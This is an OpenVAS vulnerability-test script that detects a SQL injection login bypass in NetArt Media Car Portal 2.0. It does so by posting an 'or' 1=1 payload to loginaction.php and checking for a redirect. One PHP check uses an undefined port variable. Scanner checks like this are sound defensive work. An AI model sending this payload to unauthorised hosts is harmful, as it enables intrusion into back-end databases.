##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nam_carportal_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# NetArt Media Car Portal SQL injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to bypass the security
  restrictions or view, add, modify back-end database.
  Impact Level: Application";
tag_affected = "NetArt Media Car Portal Version 2.0";

tag_insight = "The flaw exists due to the error in 'loginaction.php', which fails to
  sufficiently sanitize user-supplied data in 'Email' and 'Password'
  parameters.";
tag_solution = "No solution or patch is available as of 22nd September 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.netartmedia.net/carsportal/";
tag_summary = "This host is running NetArt Media Car Portal and is prone SQL
  injection vulnerability.";

if(description)
{
  script_id(902475);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("NetArt Media Car Portal SQL injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Determine the SQL Injection vulnerability in Car Portal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011090081");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105210/carportal20-sqlbypass.txt");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

cpPort = get_http_port(default:80);
if(!cpPort){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible paths
foreach dir (make_list("/autoportal1", "/carportal", "/", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:cpPort);
  rcvRes = http_send_recv(port:cpPort, data:sndReq);

  ## Confirm the application
  if('">Car Portal<' >< rcvRes && 'netartmedia' >< rcvRes)
  {
    filename = string(dir + "/loginaction.php");
    authVariables ="Email=%27or%27+1%3D1&Password=%27or%27+1%3D1";

    ## Construct post request
    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", get_host_name(), "\r\n",
                    "User-Agent: SQL Injection Test\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
    rcvRes = http_keepalive_send_recv(port:cpPort, data:sndReq);

    ## Check the Response and confirm the exploit
    if("Location: DEALERS/index.php" >< rcvRes)
    {
      security_hole(cpPort);
      exit(0);
    }
  }
}
